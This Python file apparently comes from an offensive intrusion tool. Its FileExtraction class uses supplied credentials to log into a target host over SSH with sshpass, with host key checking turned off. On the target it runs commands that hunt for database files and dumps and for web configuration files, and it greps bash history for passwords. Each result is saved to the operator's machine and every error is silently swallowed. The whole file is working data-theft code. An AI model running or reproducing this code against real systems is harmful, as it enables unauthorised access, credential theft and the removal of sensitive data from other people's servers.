import subprocess

class FileExtraction:
    def __init__(self, target, output_dir, logger):
        self.target = target
        self.output_dir = output_dir
        self.logger = logger
        self.extracted_data = []

    def extract(self, service, creds):
        if service == 'ssh':
            self.ssh_data_mining(creds['user'], creds['password'])

    def ssh_data_mining(self, user: str, password: str):
        """Mine data via SSH"""
        self.logger.scan("Mining data via SSH...")
        
        commands = [
            "find / -name '*.sql' -o -name '*.db' -o -name '*.dump' 2>/dev/null | head -10",
            "find /var/www -name '*.php' -o -name '*.conf' 2>/dev/null | grep -E '(config|database|db)' | head -5",
            "cat ~/.bash_history | grep -E '(mysql|psql|mongo|password)' | head -5"
        ]
        
        for i, cmd in enumerate(commands):
            try:
                ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{self.target} '{cmd}' 2>/dev/null"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
                if result.stdout:
                    with open(f"{self.output_dir}/ssh_data_{i}.txt", 'w') as f:
                        f.write(result.stdout)
                    self.logger.success(f"SSH data saved to ssh_data_{i}.txt")
                    self.extracted_data.append(f'ssh_data_{i}.txt')
            except:
                pass
